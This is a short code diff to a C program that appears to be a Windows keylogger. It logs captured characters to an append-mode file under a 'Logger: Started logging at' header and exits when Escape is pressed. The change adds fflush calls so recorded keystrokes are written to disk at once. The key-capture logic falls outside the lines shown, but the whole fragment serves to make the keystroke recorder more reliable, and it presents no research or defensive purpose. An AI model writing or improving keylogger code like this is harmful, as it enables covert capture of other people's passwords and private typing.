@@ -19,6 +19,7 @@ int main() {
 
     file= fopen(PATH, "a+");
     fprintf(file, "\n#$Logger: Started logging at: %s", ctime(&t));
+    fflush(file);
 
     while (1) {
         Sleep(20);
@@ -43,12 +44,12 @@ int main() {
                 default:
                     fputc(capture, file);
             }
-
+            fflush(file);
+            
             if ((int) capture == 27) {
                 fclose(file);
                 return 0;
             }
         }
     }
-
 }
